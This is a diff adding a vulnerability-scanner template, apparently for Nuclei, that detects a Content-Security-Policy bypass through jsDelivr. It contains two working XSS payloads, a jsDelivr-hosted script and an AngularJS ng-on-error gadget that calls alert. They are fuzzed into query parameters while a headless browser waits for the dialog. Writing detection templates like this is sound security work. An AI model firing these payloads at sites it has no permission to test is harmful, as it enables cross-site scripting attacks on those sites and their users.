@@ -1,0 +1,56 @@
+id: jsdelivr-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - jsDelivr
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,jsdelivr,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "jsdelivr.net"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: jsdelivr_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>'
+        - '<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "jsdelivr_csp_xss == true"
+# digest: 490a00463044022030292f315804daa3716ea2da8bf33fb199314d0a3b2b9cd1b5b8a885ea17756b02201bcb779f916d56660b2e926aafff37985d31fbe5e8ff49f34a7b4a630af9c35b:922c64590222798bb761d5b6d8e72950
